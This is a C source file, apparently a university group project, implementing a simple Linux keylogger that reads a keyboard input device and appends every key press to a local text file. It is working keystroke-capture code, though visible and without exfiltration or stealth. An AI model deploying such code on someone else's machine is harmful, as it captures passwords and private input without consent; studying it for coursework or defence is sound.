/*
 * Author: Group 14, I2C HSLU
*/

// Necessary includes from standard C libraries
#include <stdio.h>       // Needed for file operations (e.g., fopen, fprintf)
#include <stdlib.h>      // Needed for memory management and exit()
#include <fcntl.h>       // Needed for open() and file descriptor flags (e.g., O_RDONLY)
#include <unistd.h>      // Needed for close(), read(), and other POSIX functions
#include <linux/input.h> // Needed for the input_event struct and EV_KEY definitions

// Constants
#define KEYBOARD_DEVICE "/dev/input/event23" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
// ^ better possibility??
// grep -iA6 keyboard /proc/bus/input/devices | grep Sysfs | grep input
#define LOG_FILE_PATH "keylog.txt"

/*
 * Log keys into file
*/
void log_key(const char *filename, const char *key) {
    FILE *file = fopen(filename, "a");
    if (file == NULL) {
        perror("Error opening log file");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s\n", key);
    fclose(file);
}

/*
 * Static mapping of key codes to human readable
 * ... should be chnaged to a dynamic method, like libevdev...
*/
const char* get_key_name(int key_code) {
    static const char *key_names[] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y",
        "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE",
        "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M",
        "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE",
        "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
        "NUMLOCK", "SCROLLLOCK", "K7", "K8", "K9", "KMINUS", "K4", "K5", "K6",
        "KPLUS", "K1", "K2", "K3", "K0", "KDOT", "UNKNOWN", "ZENKAKUHANKAKU",
        "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA",
        "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ",
        "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN",
        "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA",
        "HANGEUL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", "COMPOSE", "STOP",
        "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT",
        "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE",
        "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "ROTATE_DISPLAY",
        "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD",
        "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD",
        "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT",
        "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN",
        "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21",
        "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "DASHBOARD",
        "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP",
        "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE",
        "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP",
        "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP",
        "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH",
        "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE",
        "BRIGHTNESS_AUTO", "DISPLAY_OFF", "WWAN", "RFKILL", "MICMUTE" 
    };

    if (key_code >= 0 && key_code < sizeof(key_names) / sizeof(key_names[0])) {
        return key_names[key_code];
    } else {
        return "UNKNOWN";
    }
}

/*
 * MAIN PROCEDURE
*/
int main() {
    struct input_event ev;
    int fd;

    // Open the keyboard device
    fd = open(KEYBOARD_DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Error opening input device");
        return EXIT_FAILURE;
    }

    printf("Logging keystrokes to %s\n", LOG_FILE_PATH);

    // loop
    while (1) {
	// reading keystrokes
        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
            perror("Error reading input event");
            break;
        }
	
	// Key mapping and logging
        if (ev.type == EV_KEY && ev.value == 1) { // Key press
            const char *key_name = get_key_name(ev.code);
            log_key(LOG_FILE_PATH, key_name);
        }
    }

    // Close device
    close(fd);
    return 0;
}
